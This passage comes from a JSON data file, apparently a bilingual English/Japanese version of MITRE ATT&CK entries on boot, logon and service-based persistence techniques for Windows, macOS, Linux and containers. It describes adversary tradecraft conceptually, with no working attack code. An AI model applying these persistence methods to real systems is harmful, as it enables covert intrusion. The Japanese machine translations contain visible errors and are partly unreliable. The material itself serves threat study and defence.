                        "description_eng": "Adversaries may use network logon scripts automatically executed at logon initialization to establish persistence. Network logon scripts can be assigned using Active Directory or Group Policy Objects.(Citation: Petri Logon Script AD) These logon scripts run with the privileges of the user they are assigned to. Depending on the systems within the network, initializing one of these scripts could apply to more than one or potentially all systems.  \n \nAdversaries may use these scripts to maintain persistence on a network. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.",
                        "description_jp": "攻撃者は、ログオン初期化時に自動的に実行されるネットワークログオンスクリプトを使用して、永続性を確立する可能性がある。ネットワークログオンスクリプトは、Active Directoryまたはグループポリシーオブジェクトを使用して割り当てることができます（引用：Petri Logon Script AD）。これらのログオンスクリプトは、割り当てられたユーザーの権限で実行されます。ネットワーク内のシステムによっては、これらのスクリプトの1つを初期化すると、複数のシステム、またはすべてのシステムに適用される可能性がある。  \n \n攻撃者は、これらのスクリプトを使用して、ネットワーク上の永続性を維持する可能性がある。ログオンスクリプトのアクセス構成によっては、ローカル認証情報または管理者アカウ ントが必要になる場合があります。"
                    },
                    {
                        "id": "T1037.005",
                        "name_eng": "Startup Items",
                        "name_jp": "スタートアップ・アイテム",
                        "description_eng": "Adversaries may use startup items automatically executed at boot initialization to establish persistence. Startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items.(Citation: Startup Items)\n\nThis is technically a deprecated technology (superseded by [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)), and thus the appropriate folder, <code>/Library/StartupItems</code> isn’t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist), <code>StartupParameters.plist</code>, reside in the top-level directory. \n\nAn adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism.(Citation: Methods of Mac Malware Persistence) Additionally, since StartupItems run during the bootup phase of macOS, they will run as the elevated root user.",
                        "description_jp": "攻撃者は、ブート初期化時に自動的に実行されるスタートアップ項目を使用して、永続性を確立する可能性がある。スタートアップアイテムは、ブートプロセスの最終段階で実行され、シェルスクリプトやその他の実行可能ファイルを、システムがすべてのスタートアップアイテムの実行順序を決定するために使用する設定情報とともに含んでいる(引用：スタートアップアイテム)。\n\nこれは技術的に非推奨の技術であり（[Launch Daemon](https://attack.mitre.org/techniques/T1543/004) に取って代わられた）、したがって適切なフォルダ <code>/Library/StartupItems</code> がデフォルトでシステムに存在することは保証されていませんが、macOS Sierra ではデフォルトで存在するようです。スタートアップアイテムは、実行ファイルと設定プロパティリスト（plist）である<code>StartupParameters.plist</code>が最上位ディレクトリに存在するディレクトリです。\n\n敵対者は、StartupItemsディレクトリ内に適切なフォルダ/ファイルを作成し、独自の永続化メカニズムを登録することができる（引用：Methods of Mac Malware Persistence）。さらに、StartupItemsはmacOSの起動フェーズで実行されるため、昇格したルートユーザーとして実行される。"
                    },
                    {
                        "id": "T1037.002",
                        "name_eng": "Login Hook",
                        "name_jp": "ログインフック",
                        "description_eng": "Adversaries may use a Login Hook to establish persistence executed upon user logon. A login hook is a plist file that points to a specific script to execute with root privileges upon user logon. The plist file is located in the <code>/Library/Preferences/com.apple.loginwindow.plist</code> file and can be modified using the <code>defaults</code> command-line utility. This behavior is the same for logout hooks where a script can be executed upon user logout. All hooks require administrator permissions to modify or create hooks.(Citation: Login Scripts Apple Dev)(Citation: LoginWindowScripts Apple Dev) \n\nAdversaries can add or insert a path to a malicious script in the <code>com.apple.loginwindow.plist</code> file, using the <code>LoginHook</code> or <code>LogoutHook</code> key-value pair. The malicious script is executed upon the next user login. If a login hook already exists, adversaries can add additional commands to an existing login hook. There can be only one login and logout hook on a system at a time.(Citation: S1 macOs Persistence)(Citation: Wardle Persistence Chapter)\n\n**Note:** Login hooks were deprecated in 10.11 version of macOS in favor of [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) and [Launch Agent](https://attack.mitre.org/techniques/T1543/001)",
                        "description_jp": "攻撃者は、ユーザーログオン時に実行される永続性を確立するために、ログインフックを使用する可能性がある。ログインフックは、ユーザーログオン時にroot権限で実行される特定のスクリプトを指すplistファイルです。plistファイルは<code>/Library/Preferences/com.apple.loginwindow.plist<//code>ファイルにあり、<code>defaults<//code>コマンドラインユーティリティを使って変更できます。この動作は、ユーザーのログアウト時にスクリプトを実行できるログアウトフックでも同じです。すべてのフックには、フックを変更または作成するための管理者権限が必要です。(引用: Login Scripts Apple Dev)(Citation: LoginWindowScripts Apple Dev)\n\n攻撃者は、<code>LoginHook</code>または<code>LogoutHook</code>のキーと値のペアを使用して、悪意のあるスクリプトへのパスを<code>com.apple.loginwindow.plist</code>ファイルに追加または挿入できます。悪意のあるスクリプトは、次のユーザーログイン時に実行されます。ログインフックがすでに存在する場合、敵対者は既存のログインフックにコマンドを追加することができます。ログインフックとログアウトフックは、システム上に一度に1つしか存在できない(引用：S1 macOs Persistence)(引用：Wardle Persistence Chapter)\n\n**注: **ログインフックは、macOSの10.11バージョンで非推奨となり、[Launch Daemon](https://attack.mitre.org/techniques/T1543/004) と [Launch Agent](https://attack.mitre.org/techniques/T1543/001) が採用されました。"
                    }
                ]
            },
            {
                "id": "T1543",
                "name_eng": "Create or Modify System Process",
                "name_jp": "システムプロセスの作成または変更",
                "description_eng": "Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services.(Citation: TechNet Services) On macOS, launchd processes known as [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) and [Launch Agent](https://attack.mitre.org/techniques/T1543/001) are run to finish system initialization and load user specific parameters.(Citation: AppleDocs Launch Agent Daemons) \n\nAdversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.  \n\nServices, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges.(Citation: OSX Malware Detection)",
                "description_jp": "攻撃者は、システムレベルのプロセスを作成または変更し、永続化の一環として悪意のあるペイロードを繰り返し実行する可能性があります。オペレーティングシステムが起動すると、バックグラウンドのシステム機能を実行するプロセスを開始することができる。引用：TechNet Services） macOSでは、[Launch Daemon](https://attack.mitre.org/techniques/T1543/004)および[Launch Agent](https://attack.mitre.org/techniques/T1543/001)として知られるlaunchdプロセスが実行され、システムの初期化を完了し、ユーザー固有のパラメータをロードします。\n\n攻撃者は、永続性を確立するために、起動時または繰り返し実行されるように設定できる新しいサービス、デーモン、またはエージェントをインストールすることができる。同様に、敵対者は既存のサービス、デーモン、またはエージェントを変更して、同じ効果を得ることもできる。  \n\nサービス、デーモン、またはエージェントは、管理者権限で作成されるが、root/SYSTEM 権限で実行されるかもしれない。敵はこの機能を利用して、特権をエスカレートさせるためにシステムプロセスを作成または変更する可能性があります。 引用：OSXマルウェア検出",
                "subtechniques": [
                    {
                        "id": "T1543.004",
                        "name_eng": "Launch Daemon",
                        "name_jp": "デーモン起動",
                        "description_eng": "Adversaries may create or modify Launch Daemons to execute malicious payloads as part of persistence. Launch Daemons are plist files used to interact with Launchd, the service management framework used by macOS. Launch Daemons require elevated privileges to install, are executed for every user on a system prior to login, and run in the background without the need for user interaction. During the macOS initialization startup, the launchd process loads the parameters for launch-on-demand system-level daemons from plist files found in <code>/System/Library/LaunchDaemons/</code> and <code>/Library/LaunchDaemons/</code>. Required Launch Daemons parameters include a <code>Label</code> to identify the task, <code>Program</code> to provide a path to the executable, and <code>RunAtLoad</code> to specify when the task is run. Launch Daemons are often used to provide access to shared resources, updates to software, or conduct automation tasks.(Citation: AppleDocs Launch Agent Daemons)(Citation: Methods of Mac Malware Persistence)(Citation: launchd Keywords for plists)\n\nAdversaries may install a Launch Daemon configured to execute at startup by using the <code>RunAtLoad</code> parameter set to <code>true</code> and the <code>Program</code> parameter set to the malicious executable path. The daemon name may be disguised by using a name from a related operating system or benign software (i.e. [Masquerading](https://attack.mitre.org/techniques/T1036)). When the Launch Daemon is executed, the program inherits administrative permissions.(Citation: WireLurker)(Citation: OSX Malware Detection)\n\nAdditionally, system configuration changes (such as the installation of third party package managing software) may cause folders such as <code>usr/local/bin</code> to become globally writeable. So, it is possible for poor configurations to allow an adversary to modify executables referenced by current Launch Daemon's plist files.(Citation: LaunchDaemon Hijacking)(Citation: sentinelone macos persist Jun 2019)",
                        "description_jp": "攻撃者は、永続化の一環として悪意のあるペイロードを実行するためにLaunch Daemonを作成または変更する可能性があります。Launch Daemonは、macOSで使用されるサービス管理フレームワークであるLaunchdとやり取りするために使用されるplistファイルです。Launch Daemonのインストールには昇格権限が必要で、ログイン前にシステム上のすべてのユーザーに対して実行され、ユーザーの操作を必要とせずにバックグラウンドで実行されます。macOS の初期化起動中に、launchd プロセスは、<code>/System/Library/LaunchDaemons/</code> および <code>/Library/LaunchDaemons/</code> にある plist ファイルから、起動オンデマンドのシステムレベルデーモンのパラメータをロードします。Launch Daemons の必須パラメータには、タスクを識別するための <code>Label</code> 、実行ファイルへのパスを提供する <code>Program</code> 、タスクが実行されるタイミングを指定する <code>RunAtLoad</code> が含まれます。Launchデーモンは、共有リソースへのアクセス、ソフトウェアのアップデート、自動化タスクの実行によく使用されます。 (引用: AppleDocs Launch Agent Daemons)(Citation: Methods of Mac Malware Persistence)(Citation: launchd Plistsのキーワード)\n\n攻撃者は、<code>RunAtLoad</code> パラメータを <code>true</code> に設定し、<code>Program</code> パラメータを悪意のある実行可能パスに設定することで、起動時に実行するように設定された Launch Daemon をインストールすることができます。デーモン名は、関連するオペレーティングシステムまたは良性のソフトウェアからの名前を使用して偽装することができます（すなわち、[Masquerading](https://attack.mitre.org/techniques/T1036)）。Launch Daemonが実行されると、プログラムは管理者権限を継承します。(引用：WireLurker)(引用：OSX Malware Detection)\n\nさらに、システム設定の変更（サードパーティ製のパッケージ管理ソフトウェアのインストールなど）によって、<code>usr/local/bin</code>などのフォルダがグローバルに書き込み可能になることがあります。そのため、設定の不備によって、現在のLaunch Daemonのplistファイルによって参照される実行可能ファイルを敵対者が変更できる可能性があります。 引用：LaunchDaemonハイジャック）（引用：sentinelone macos persist 2019年6月号"
                    },
                    {
                        "id": "T1543.005",
                        "name_eng": "Container Service",
                        "name_jp": "コンテナサービス",
                        "description_eng": "Adversaries may create or modify container or container cluster management tools that run as daemons, agents, or services on individual hosts. These include software for creating and managing individual containers, such as Docker and Podman, as well as container cluster node-level agents such as kubelet. By modifying these services, an adversary may be able to achieve persistence or escalate their privileges on a host.\n\nFor example, by using the `docker run` or `podman run` command with the `restart=always` directive, a container can be configured to persistently restart on the host.(Citation: AquaSec TeamTNT 2023) A user with access to the (rootful) docker command may also be able to escalate their privileges on the host.(Citation: GTFOBins Docker)\n\nIn Kubernetes environments, DaemonSets allow an adversary to persistently [Deploy Container](https://attack.mitre.org/techniques/T1610)s on all nodes, including ones added later to the cluster.(Citation: Aquasec Kubernetes Attack 2023)(Citation: Kubernetes DaemonSet) Pods can also be deployed to specific nodes using the `nodeSelector` or `nodeName` fields in the pod spec.(Citation: Kubernetes Assigning Pods to Nodes)(Citation: AppSecco Kubernetes Namespace Breakout 2020)\n\nNote that containers can also be configured to run as [Systemd Service](https://attack.mitre.org/techniques/T1543/002)s.(Citation: Podman Systemd)(Citation: Docker Systemd)",
                        "description_jp": "攻撃者は、個々のホスト上でデーモン、エージェント、またはサービスとして実行されるコンテナまたはコンテナ・クラスタ管理ツールを作成または変更する可能性があります。これには、DockerやPodmanなどの個々のコンテナを作成および管理するソフトウェアや、kubeletなどのコンテナ・クラスタ・ノード・レベルのエージェントが含まれます。これらのサービスを変更することで、敵はホスト上で永続性を実現したり、特権をエスカレートしたりできる可能性があります。\n\n例えば、`docker run`コマンドや`podman run`コマンドに`restart=always`ディレクティブを指定することで、コンテナをホスト上で持続的に再起動するように設定することができる。(引用：AquaSec TeamTNT 2023) また、(rootfulな)dockerコマンドにアクセスできるユーザーであれば、ホスト上で特権をエスカレートできる可能性がある。\n\nKubernetes環境では、DaemonSetによって、敵対者は、クラスタに後から追加されたものも含め、すべてのノード上で永続的に[Deploy Container](https://attack.mitre.org/techniques/T1610)することができます。(引用: Aquasec Kubernetes Attack 2023)(引用: Kubernetes DaemonSet) Podは、Pod specの`nodeSelector`または`nodeName`フィールドを使用して特定のノードにデプロイすることもできます(引用: Kubernetes Assigning Pods to Nodes)(引用: AppSecco Kubernetes Namespace Breakout 2020)\n\nコンテナは[Systemd Service](https://attack.mitre.org/techniques/T1543/002)として実行するように設定することもできることに注意してください。(引用: Podman Systemd)(引用: Docker Systemd)"
                    },
                    {
                        "id": "T1543.001",
                        "name_eng": "Launch Agent",
                        "name_jp": "ローンチエージェント",
                        "description_eng": "Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. When a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (.plist) file found in <code>/System/Library/LaunchAgents</code>, <code>/Library/LaunchAgents</code>, and <code>~/Library/LaunchAgents</code>.(Citation: AppleDocs Launch Agent Daemons)(Citation: OSX Keydnap malware) (Citation: Antiquated Mac Malware) Property list files use the <code>Label</code>, <code>ProgramArguments </code>, and <code>RunAtLoad</code> keys to identify the Launch Agent's name, executable location, and execution time.(Citation: OSX.Dok Malware) Launch Agents are often installed to perform updates to programs, launch user specified programs at login, or to conduct other developer tasks.\n\n Launch Agents can also be executed using the [Launchctl](https://attack.mitre.org/techniques/T1569/001) command.\n \nAdversaries may install a new Launch Agent that executes at login by placing a .plist file into the appropriate folders with the <code>RunAtLoad</code> or <code>KeepAlive</code> keys set to <code>true</code>.(Citation: Sofacy Komplex Trojan)(Citation: Methods of Mac Malware Persistence) The Launch Agent name may be disguised by using a name from the related operating system or benign software. Launch Agents are created with user level privileges and execute with user level permissions.(Citation: OSX Malware Detection)(Citation: OceanLotus for OS X)",
                        "description_jp": "攻撃者は、永続性の一部として悪意のあるペイロードを繰り返し実行するために、ローンチエージェントを作成または変更する可能性があります。ユーザーがログインすると、ユーザーごとの launchd プロセスが開始され、<code>/System/Library/LaunchAgents</code>、<code>/Library/LaunchAgents</code>、<code>~/Library/LaunchAgents</code> にあるプロパティリスト (.plist) ファイルから、各 launch-on-demand ユーザーエージェントのパラメータがロードされます。(引用：AppleDocs Launch Agent Daemons)(引用：OSX Keydnap malware)(引用：Antiquated Mac Malware) プロパティリストファイルは、<code>Label</code>、<code>ProgramArguments</code>、<code>RunAtLoad</code>キーを使用して、Launch Agentの名前、実行可能な場所、および実行時間を特定します。(引用：OSX.Dok Malware) Launch Agentは、プログラムのアップデートを実行したり、ログイン時にユーザーが指定したプログラムを起動したり、その他の開発者タスクを実行したりするためにインストールされることがよくあります。\n\n 起動エージェントは、[Launchctl](https://attack.mitre.org/techniques/T1569/001)コマンドを使用して実行することもできます。\n \n攻撃者は、<code>RunAtLoad</code>キーまたは<code>KeepAlive</code>キーを<code>true</code>に設定した.plistファイルを適切なフォルダに配置することで、ログイン時に実行される新しいLaunch Agentをインストールすることができます（引用：Sofacy Komplex Trojan）（引用：Methods of Mac Malware Persistence）Launch Agentの名前は、関連するオペレーティングシステムまたは良性のソフトウェアの名前を使用して偽装することができます。起動エージェントは、ユーザーレベルの権限で作成され、ユーザーレベルの権限で実行されます。 引用：OSXマルウェア検出）（引用：OceanLotus for OS X"
                    },
                    {
                        "id": "T1543.002",
                        "name_eng": "Systemd Service",
                        "name_jp": "Systemdサービス",
                        "description_eng": "Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. Systemd is a system and service manager commonly used for managing background daemon processes (also known as services) and other system resources.(Citation: Linux man-pages: systemd January 2014) Systemd is the default initialization (init) system on many Linux distributions replacing legacy init systems, including SysVinit and Upstart, while remaining backwards compatible.  \n\nSystemd utilizes unit configuration files with the `.service` file extension to encode information about a service's process. By default, system level unit files are stored in the `/systemd/system` directory of the root owned directories (`/`). User level unit files are stored in the `/systemd/user` directories of the user owned directories (`$HOME`).(Citation: lambert systemd 2022) \n\nInside the `.service` unit files, the following directives are used to execute commands:(Citation: freedesktop systemd.service)  \n\n* `ExecStart`, `ExecStartPre`, and `ExecStartPost` directives execute when a service is started manually by `systemctl` or on system start if the service is set to automatically start.\n* `ExecReload` directive executes when a service restarts. \n* `ExecStop`, `ExecStopPre`, and `ExecStopPost` directives execute when a service is stopped.  \n\nAdversaries have created new service files, altered the commands a `.service` file’s directive executes, and modified the user directive a `.service` file executes as, which could result in privilege escalation. Adversaries may also place symbolic links in these directories, enabling systemd to find these payloads regardless of where they reside on the filesystem.(Citation: Anomali Rocke March 2019)(Citation: airwalk backdoor unix systems)(Citation: Rapid7 Service Persistence 22JUNE2016) \n\nThe `.service` file’s User directive can be used to run service as a specific user, which could result in privilege escalation based on specific user/group permissions. \n\nSystemd services can be created via systemd generators, which support the dynamic generation of unit files. Systemd generators are small executables that run during boot or configuration reloads to dynamically create or modify systemd unit files by converting non-native configurations into services, symlinks, or drop-ins (i.e., [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037)).(Citation: Elastic Security Labs Linux Persistence 2024)(Citation: Pepe Berba Systemd 2022)",
                        "description_jp": "攻撃者は、永続化の一環として悪意のあるペイロードを繰り返し実行するために、systemdサービスを作成または変更する可能性があります。Systemdは、バックグラウンドのデーモンプロセス（サービスとも呼ばれる）やその他のシステムリソースを管理するために一般的に使用されるシステムおよびサービスマネージャです。(引用: Linux man-pages: systemd January 2014) Systemdは、多くのLinuxディストリビューションで、SysVinitやUpstartなどのレガシーなinitシステムに取って代わるデフォルトの初期化（init）システムです。  \n\nSystemd はサービスのプロセスに関する情報をエンコードするために `.service` ファイル拡張子を持つユニット設定ファイルを利用します。デフォルトでは、システムレベルのユニットファイルはルート所有ディレクトリ (`//`) の `/systemd/system` ディレクトリに格納されます。ユーザーレベルのユニットファイルは、ユーザー所有のディレクトリ (`$HOME`) の `/systemd/user` ディレクトリに格納される。(引用: lambert systemd 2022)\n\nユニットファイル `.service` 内では、以下のディレクティブがコマンド実行に使用される:(引用: freedesktop systemd.service)\n\n* ExecStart`、`ExecStartPre`、`ExecStartPost` ディレクティブは、サービスが `systemctl` によって手動で起動されたとき、またはサービスが自動的に起動するように設定されている場合はシステム起動時に実行されます。\n* ExecReload` ディレクティブはサービスが再起動したときに実行される。\n* ExecStop`, `ExecStopPre`, `ExecStopPost` ディレクティブはサービスが停止したときに実行される。  \n\n逆境者は新しいサービスファイルを作成したり、`.service` ファイルのディレクティブが実行するコマンドを変更したり、`.service` ファイルが実行するユーザディレクティブを変更したりして、特権を昇格させる可能性があります。攻撃者はまた、これらのディレクトリにシンボリックリンクを設置し、ファイルシステムのどこに存在するかに関係なく、systemd がこれらのペイロードを見つけられるようにする可能性があります。(引用: Anomali Rocke March 2019)(引用: airwalk backdoor unix systems)(引用: Rapid7 Service Persistence 22JUNE2016)\n\n.service`ファイルのUserディレクティブは、特定のユーザーとしてサービスを実行するために使用することができ、特定のユーザー/グループのパーミッションに基づいて特権の昇格を引き起こす可能性があります。\n\nSystemd サービスは、ユニットファイルの動的生成をサポートする systemd ジェネレータを使って作成できます。Systemd ジェネレータは、ブートや設定のリロード中に実行される小さな実行ファイルで、ネイティブでない設定をサービスやシンボリックリンク、ドロップイン（[Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037)など）に変換することで、systemd ユニットファイルを動的に作成または変更します。(引用: Elastic Security Labs Linux Persistence 2024)(Citation: Pepe Berba Systemd 2022)"
                    },
                    {
                        "id": "T1543.003",
                        "name_eng": "Windows Service",
                        "name_jp": "Windowsサービス",
                        "description_eng": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create ‘hidden’ services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",
                        "description_jp": "攻撃者は、永続化の一環として悪意のあるペイロードを繰り返し実行するために、Windowsサービスを作成または変更する可能性がある。Windowsが起動すると、バックグラウンドのシステム機能を実行するサービスと呼ばれるプログラムやアプリケーションが起動する（引用：TechNet Services）。サービスの実行ファイルや回復プログラム/コマンドへのファイルパスを含むWindowsサービス構成情報は、Windowsレジストリに保存される。\n\n攻撃者は、システム上で持続するために、新しいサービスをインストールしたり、既存のサービスを変更して起動時に実行したりする可能性がある。サービスコンフィギュレーションは、システムユーティリティ（sc.exeなど）を使用するか、レジストリを直接変更するか、Windows APIと直接やりとりすることで設定または変更できる。\n\n攻撃者はまた、サービスを使って悪意のあるドライバーをインストールし、実行することもある。例えば、ドライバファイル(ex: `.sys`)をディスクにドロップした後、`CreateServiceW()`のような[Native API](https://attack.mitre.org/techniques/T1106)関数(または `ZwLoadDriver()`や`ZwSetValueKey()`のような関数を介して手動で)、必要なサービスレジストリ値を作成することによって、ペイロードをロードして登録することができる。レジストリの変更](https://attack.mitre.org/techniques/T1112) などの関数を使用するか、`PnPUtil.exe` などのコマンドラインユーティリティを使用します。Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) 敵対者は、これらのドライバを[Rootkit](https://attack.mitre.org/techniques/T1014)として活用し、システム上の悪意のある活動の存在を隠す可能性があります。攻撃者はまた、[Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)の一環として、署名済みでありながら脆弱なドライバを侵害されたマシンにロードする可能性があります(「Bring Your Own Vulnerable Driver」(BYOVD)として知られています)(引用: ESET InvisiMole 2020年6月)(引用: Unit42 AcidBox 2020年6月)\n\nサービスは管理者権限で作成されますが、SYSTEM権限で実行されるため、敵は特権をエスカレートさせるためにサービスを使用する可能性もあります。また、敵は[Service Execution](https://attack.mitre.org/techniques/T1569/002)を通じてサービスを直接起動することもできます。\n\n検出分析をより困難にするために、悪意のあるサービスは[マスカレードタスクまたはサービス](https://attack.mitre.org/techniques/T1036/004)(例：正規のOSまたは良性のソフトウェアコンポーネントに関連するサービス名および/またはペイロード名を使用)を組み込むこともあります。例えば、`sc sdset` コマンドを使用して、Service Descriptor Definition Language (SDDL) 経由でサービスのパーミッションを設定します。これは、`Get-Service`、`sc query`、`services.exe`などの標準的なサービス列挙メソッドの視界からWindowsサービスを隠す可能性がある（引用：SANS 1）（引用：SANS 2）。"
                    }
                ]
            },
            {
                "id": "T1547",
                "name_eng": "Boot or Logon Autostart Execution",
                "name_jp": "ブートまたはログオンの自動開始実行",
                "description_eng": "Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.(Citation: Microsoft Run Key)(Citation: MSDN Authentication Packages)(Citation: Microsoft TimeProvider)(Citation: Cylance Reg Persistence Sept 2013)(Citation: Linux Kernel Programming) These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.\n\nSince some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.",
                "description_jp": "攻撃者は、侵害されたシステム上で永続性を維持したり、より高いレベルの特権を獲得したりするために、システムの起動時やログオン時にプログラムを自動的に実行するようにシステム設定を構成することがあります。オペレーティングシステムは、システムブート時またはアカウントログオン時にプログラムを自動的に実行するメカニズムを備えている場合があります（引用：Microsoft Run Key）（引用：MSDN Authentication Packages）（引用：Microsoft TimeProvider）（引用：Cylance Reg Persistence Sept 2013）（引用：Linux Kernel Programming）これらのメカニズムには、特別に指定されたディレクトリに配置されたプログラムを自動的に実行したり、Windowsレジストリなどの構成情報を格納するリポジトリから参照されたりする場合があります。敵対者は、カーネルの機能を変更または拡張することで、同じ目標を達成することができる。\n\nブートまたはログオンの自動開始プログラムの中には、より高い特権で実行されるものがあるため、敵対者はこれらを利用して特権を昇格させる可能性がある。",
                "subtechniques": [
                    {
                        "id": "T1547.009",
                        "name_eng": "Shortcut Modification",
                        "name_jp": "ショートカットの変更",
                        "description_eng": "Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.\n\nAdversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence.(Citation: Shortcut for Persistence ) Although often used as payloads in an infection chain (e.g. [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)), adversaries may also create a new shortcut as a means of indirection, while also abusing [Masquerading](https://attack.mitre.org/techniques/T1036) to make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.\n\nShortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g. [Browser Extensions](https://attack.mitre.org/techniques/T1176/001)) to persistently launch malware.",
                        "description_jp": "攻撃者は、システム起動中やユーザーログイン中にプログラムを実行できるショートカットを作成または変更する可能性があります。ショートカットやシンボリックリンクは、そのショートカットがクリックされたり、システムの起動プロセスで実行されたりしたときに開かれたり実行されたりする他のファイルやプログラムを参照するために使用されます。\n\n攻撃者は、スタートアップフォルダ内のショートカットを悪用してツールを実行し、永続性を実現することがあります。(引用: 永続性を実現するショートカット) 感染チェーンのペイロードとして使用されることがよくありますが (例: [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)) 、攻撃者は、不正なショートカットを正規のプログラムのように見せるために [Masquerading] (https://attack.mitre.org/techniques/T1036) を悪用しながら、間接的な手段として新しいショートカットを作成することもあります。また、標的のパスを編集したり、既存のショートカットを完全に置き換えたりすることで、意図した正規プログラムの代わりにマルウェアを実行させることも可能です。\n\nまた、ショートカットを悪用して、他の方法を実装することで永続性を確立することも可能です。たとえば、LNKブラウザの拡張機能を変更して（[ブラウザ拡張機能](https://attack.mitre.org/techniques/T1176/001)など）、マルウェアを持続的に起動させることができます。"
                    },
                    {
                        "id": "T1547.006",
                        "name_eng": "Kernel Modules and Extensions",
                        "name_jp": "カーネルモジュールと拡張機能",
                        "description_eng": "Adversaries may modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system.(Citation: Linux Kernel Programming) \n\nWhen used maliciously, LKMs can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0).(Citation: Linux Kernel Module Programming Guide) Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors, and enabling root access to non-privileged users.(Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used in macOS to load functionality onto a system similar to LKMs for Linux. Since the kernel is responsible for enforcing security and the kernel extensions run as apart of the kernel, kexts are not governed by macOS security policies. Kexts are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Kexts need to be signed with a developer ID that is granted privileges by Apple allowing it to sign Kernel extensions. Developers without these privileges may still sign kexts but they will not load unless SIP is disabled. If SIP is enabled, the kext signature is verified before being added to the AuxKC.(Citation: System and kernel extensions in macOS)\n\nSince macOS Catalina 10.15, kernel extensions have been deprecated in favor of System Extensions. However, kexts are still allowed as \"Legacy System Extensions\" since there is no System Extension for Kernel Programming Interfaces.(Citation: Apple Kernel Extension Deprecation)\n\nAdversaries can use LKMs and kexts to conduct [Persistence](https://attack.mitre.org/tactics/TA0003) and/or [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) on a system. Examples have been found in the wild, and there are some relevant open source projects as well.(Citation: Volatility Phalanx2)(Citation: CrowdStrike Linux Rootkit)(Citation: GitHub Reptile)(Citation: GitHub Diamorphine)(Citation: RSAC 2015 San Francisco Patrick Wardle)(Citation: Synack Secure Kernel Extension Broken)(Citation: Securelist Ventir)(Citation: Trend Micro Skidmap)",
